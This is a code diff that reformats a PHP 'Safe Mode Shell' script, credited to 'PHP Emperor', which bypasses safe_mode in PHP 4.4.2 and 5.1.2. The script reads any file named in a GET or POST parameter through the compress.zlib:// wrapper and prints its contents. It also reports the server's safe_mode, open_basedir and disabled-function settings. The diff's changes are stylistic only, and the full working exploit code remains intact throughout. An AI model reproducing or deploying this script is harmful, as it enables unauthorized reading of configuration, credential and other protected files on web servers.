@@ -24,35 +24,32 @@ Safe_Mode Bypass PHP 4.4.2 and PHP 5.1.2
 by PHP Emperor<xb5@hotmail.com>
 */
 
-echo "<head><title>Safe Mode Shell</title></head>";
+echo '<head><title>Safe Mode Shell</title></head>';
 
+$tymczas = './'; // Set $tymczas to dir where you have 777 like /var/tmp
 
-
-
-$tymczas="./"; // Set $tymczas to dir where you have 777 like /var/tmp
-
-if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
+if (@ini_get('safe_mode') or 'on' == strtolower(@ini_get('safe_mode'))) {
     $safemode = true;
-    $hsafemode = "<font color=\"red\">ON (secure)</font>";
+    $hsafemode = '<font color="red">ON (secure)</font>';
 } else {
     $safemode = false;
-    $hsafemode = "<font color=\"green\">OFF (not secure)</font>";
+    $hsafemode = '<font color="green">OFF (not secure)</font>';
 }
-echo("Safe-mode: $hsafemode");
-$v = @ini_get("open_basedir");
-if ($v or strtolower($v) == "on") {
+echo "Safe-mode: $hsafemode";
+$v = @ini_get('open_basedir');
+if ($v or 'on' == strtolower($v)) {
     $openbasedir = true;
-    $hopenbasedir = "<font color=\"red\">".$v."</font>";
+    $hopenbasedir = '<font color="red">' . $v . '</font>';
 } else {
     $openbasedir = false;
-    $hopenbasedir = "<font color=\"green\">OFF (not secure)</font>";
+    $hopenbasedir = '<font color="green">OFF (not secure)</font>';
 }
-echo("<br>");
-echo("Open base dir: $hopenbasedir");
-echo("<br>");
-echo "Disable functions : <b>";
-if (''==($df=@ini_get('disable_functions'))) {
-    echo "<font color=green>NONE</font></b>";
+echo '<br>';
+echo "Open base dir: $hopenbasedir";
+echo '<br>';
+echo 'Disable functions : <b>';
+if ('' == ($df = @ini_get('disable_functions'))) {
+    echo '<font color=green>NONE</font></b>';
 } else {
     echo "<font color=red>$df</font></b>";
 }
@@ -64,8 +61,8 @@ $all = @disk_total_space($dir);
 if (!$all) {
     $all = 0;
 }
-$used = $all-$free;
-$used_percent = @round(100/($all/$free), 2);
+$used = $all - $free;
+$used_percent = @round(100 / ($all / $free), 2);
 
 echo "<PRE>\n";
 if (empty($file)) {
@@ -75,29 +72,29 @@ if (empty($file)) {
 COLOR=\"RED\">PHP Emperor
 xb5@hotmail.com</FONT></CENTER></B>");
         } else {
-            $file=$_POST['file'];
+            $file = $_POST['file'];
         }
     } else {
-        $file=$_GET['file'];
+        $file = $_GET['file'];
     }
 }
 
-$temp=tempnam($tymczas, "cx");
+$temp = tempnam($tymczas, 'cx');
 
-if (copy("compress.zlib://".$file, $temp)) {
-    $zrodlo = fopen($temp, "r");
+if (copy('compress.zlib://' . $file, $temp)) {
+    $zrodlo = fopen($temp, 'r');
     $tekst = fread($zrodlo, filesize($temp));
     fclose($zrodlo);
-    echo "<B>--- Start File ".htmlspecialchars($file)."
--------------</B>\n".htmlspecialchars($tekst)."\n<B>--- End File
-".htmlspecialchars($file)." ---------------\n";
+    echo '<B>--- Start File ' . htmlspecialchars($file) . "
+-------------</B>\n" . htmlspecialchars($tekst) . "\n<B>--- End File
+" . htmlspecialchars($file) . " ---------------\n";
     unlink($temp);
     die("\n<FONT COLOR=\"RED\"><B>File
-".htmlspecialchars($file)." has been already loaded. PHP Emperor <xb5@hotmail.com>
-;]</B></FONT>");
+" . htmlspecialchars($file) . ' has been already loaded. PHP Emperor <xb5@hotmail.com>
+;]</B></FONT>');
 } else {
-    die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
-<B>".htmlspecialchars($file)."</B> dosen't exists or you don't have
+    die('<FONT COLOR="RED"><CENTER>Sorry... File
+<B>' . htmlspecialchars($file) . "</B> dosen't exists or you don't have
 access.</CENTER></FONT>");
 }
 ?>
